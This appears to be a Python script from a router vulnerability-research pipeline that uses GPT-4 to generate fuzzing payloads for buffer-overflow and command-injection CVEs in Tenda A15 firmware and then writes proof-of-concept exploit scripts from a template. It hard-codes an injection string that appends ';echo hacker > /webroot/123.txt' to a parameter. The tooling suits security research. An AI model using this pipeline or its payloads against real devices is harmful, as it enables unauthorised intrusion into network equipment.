import json
import os
import re
import time
from pathlib import Path
from dotenv import load_dotenv
from openai import OpenAI
from datetime import datetime

# --- Configuration ---
VENDOR        = "Tenda"
SERIES        = "A"
PRODUCT       = "A15"
RESULT_DIR    = "result"
POC_DIR       = Path(f"./{VENDOR}/{SERIES}/{PRODUCT}/POC")
POC_SUCCESS   = POC_DIR / "success"
OPENAI_MODEL  = "gpt-4"

# --- Paths ---
BASE_DIR     = Path(f"./{VENDOR}/{SERIES}/{PRODUCT}")
INPUT_JSON   = BASE_DIR / RESULT_DIR / f"{PRODUCT}.json"
OUTPUT_JSON  = BASE_DIR / RESULT_DIR / f"{PRODUCT}.json"
PROMPT_ROOT  = Path(__file__).resolve().parent.parent / "prompt" / "fuzz"

# --- Helpers ---
def load_json(path: Path):
    if not path.exists():
        print(f"❌ 文件不存在: {path}")
        return None
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        print(f"❌ 读取 JSON 失败 {path}: {e}")
        return None

def save_json(data, path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"✅ 保存结果: {path}")

def read_text(path: Path) -> str:
    return path.read_text(encoding="utf-8").strip() if path.is_file() else ""


def parse_payload_to_dict(payload: str) -> dict:
    result = {}
    for pair in payload.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result

# --- Payload Generation ---
def generate_payloads():
    # 1. 初始化 OpenAI
    load_dotenv()
    client_options = {"api_key": os.getenv("OPENAI_API_KEY")}
    if os.getenv("OPENAI_API_BASE"):
        client_options["base_url"] = os.getenv("OPENAI_API_BASE")
    client = OpenAI(**client_options)

    # 2. 加载输入 JSON
    data = load_json(INPUT_JSON)
    if data is None:
        return

    # 3. 生成 payloads
    for entry in data:
        match_results = entry.get("match_result")
        if not match_results:
            continue
        entry["payloads"] = []
        entry_json = json.dumps(entry, ensure_ascii=False)
        content    = entry.get("content", "")

        for m in entry.get("match_result", []):
            # --- 新增：仅处理 overflow / injection 类型 ---
            vul_type = (m.get("vul_type") or "").strip().lower()
            if vul_type not in {"overflow", "injection"}:
                print(f"⏭️ 跳过类型为 {vul_type} 的漏洞（不支持自动生成 payload）")
                continue

            # 选择对应的 prompt 模板
            prompt_md = PROMPT_ROOT / f"{vul_type}.md"
            template  = read_text(prompt_md)

            # 填充 prompt 占位
            parameter = m.get("parameter or argument", "")
            prompt = (
                template
                .replace("{json}", entry_json)
                .replace("{content}", content)
                .replace("{parameter}", parameter)
            )

            # 读取 CVE 报告
            cve_id    = m.get("CVE ID", "").strip()
            prod      = m.get("product", PRODUCT).strip()
            report_md = BASE_DIR.parent / prod / "CVE_report" / f"{cve_id}.md"
            report    = read_text(report_md)
            prompt    = prompt.replace("{CVE_report}", report)

            # 调用 LLM
            try:
                resp = client.chat.completions.create(
                    model=OPENAI_MODEL,
                    temperature=0.2,
                    messages=[
                        {"role": "system", "content": "You are a penetration tester who crafts precise fuzz payloads."},
                        {"role": "user",   "content": prompt},
                    ],
                    max_tokens=2000,
                )
                # print(prompt)
                text = resp.choices[0].message.content.strip().replace("```json", "").replace("```", "")
                time.sleep(2)
            except Exception as e:
                print(f"❌ 生成 payload 失败 ({cve_id}): {e}")
                text = ""

            # 解析 JSON 输出
            try:
                obj = json.loads(text)
                raw_payloads = obj.get("payloads", [])
                print("Payloads by LLM 🤖", raw_payloads)
            except json.JSONDecodeError:
                print(f"⚠️ 无法解析 JSON 返回：\n{text}")
                raw_payloads = []

            # 根据漏洞类型替换占位符
            for p in raw_payloads:
                if vul_type == "overflow":
                    # 检测是否存在9个以上连续的"a"字符
                    match = re.search(r"a{9,}", p)
                    if match:
                        real = re.sub(r"a{9,}", "A" * 2000, p, count=1)
                        real = real.replace("{payload}", "A" * 2000)
                    else:
                        real = p.replace("{payload}", "A" * 2000)
                elif vul_type == "injection":
                    real = p.replace("{payload}", ";echo hacker > /webroot/123.txt")
                else:
                    real = p
                entry["payloads"].append(real)

    # 4. 保存带 payloads 的 JSON
    save_json(data, OUTPUT_JSON)


# --- Generate POCs to files ---
def generate_poc_files():
    template_path = Path(__file__).resolve().parent.parent / "prompt" / "poc" / "Tenda.py"
    template_code = read_text(template_path)
    if not template_code:
        print("❌ 模板读取失败")
        return

    data = load_json(INPUT_JSON)
    if data is None:
        return

    POC_DIR.mkdir(parents=True, exist_ok=True)
    POC_SUCCESS.mkdir(parents=True, exist_ok=True)

    count = 0
    for i, entry in enumerate(data):
        match_result = entry.get("match_result")
        uri_template = entry.get("URI")
        payloads = entry.get("payloads", [])
        content = entry.get("content", "")

        # 自动处理 CSRF 情况
        for m in match_result or []:
            vul_type = m.get("vul_type", "").strip().lower()
            if vul_type == "csrf" and not payloads:
                payloads = [content]  # 用 content 作为唯一 payload

        if not match_result or not payloads or not uri_template:
            continue

        sanitized_uri = re.sub(r'[^a-zA-Z0-9_]', '_', uri_template.strip('/'))

        for j, payload in enumerate(payloads):
            count += 1
            poc_code = template_code.replace("{URI}", uri_template)
            data_dict = parse_payload_to_dict(payload)
            data_string = "{\n" + ",\n".join([f'    "{k}": "{v}"' for k, v in data_dict.items()]) + "\n}"
            poc_code = poc_code.replace('{"payload"}', data_string)

            filename = POC_DIR / f"{sanitized_uri}_{j+1}.py"
            filename.write_text(poc_code, encoding="utf-8")
    print(f"✅ 共生成 {count} 个 POC 脚本并保存到 {POC_DIR}")


if __name__ == "__main__":
    print("当前时间是：", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    generate_payloads()
    generate_poc_files()
    print("当前时间是：", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
